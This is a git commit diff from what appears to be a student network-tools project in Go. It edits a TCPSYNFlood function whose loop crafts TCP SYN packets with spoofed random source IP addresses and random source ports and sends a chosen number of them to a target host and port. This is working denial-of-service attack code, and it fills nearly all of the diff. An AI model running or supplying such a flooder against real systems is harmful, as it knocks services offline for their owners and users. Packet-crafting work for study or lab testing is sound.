bd294c814ac2343b3d93028a07df02bf8bbd13a9
Tiago Diogo <tiago.m.diogo@tecnico.ulisboa.pt>
2023-10-25 01:51:49 +0100

    Fixed

--- higherlevel/tcpsyn.go
+++ higherlevel/tcpsyn.go
@@ -9,11 +9,6 @@ import (
 
 func TCPSYNFlood(iface, targetIP, targetPort string, numberOfPackets int) {
 
-	ethLayer := packet.EthernetLayer()
-	ethLayer.SetEthernetType(golayers.EthernetTypeIPv4)
-	ethLayer.SetSrcMAC(utils.MacByInt(iface))
-	destinationMac, _ := ARPScanHost(iface, targetIP)
-	ethLayer.SetDstMAC(destinationMac)
 	ipLayer := packet.IPv4Layer()
 	ipLayer.SetDstIP(targetIP)
 	ipLayer.SetProtocol(golayers.IPProtocolTCP)
@@ -24,8 +19,7 @@ func TCPSYNFlood(iface, targetIP, targetPort string, numberOfPackets int) {
 	for i := 0; i < numberOfPackets; i++ {
 		ipLayer.SetSrcIP(utils.ParseIPGen())
 		tcpLayer.SetSrcPort(utils.RandomPort())
-		tcpLayer.Layer().SetNetworkLayerForChecksum(ipLayer.Layer())
-		completePacket, _ := packet.CraftPacket(ethLayer.Layer(), ipLayer.Layer(), tcpLayer.Layer())
+		completePacket, _ := packet.CraftPacket(ipLayer.Layer(), tcpLayer.Layer())
 		communication.Send(completePacket, iface)
 	}
 }
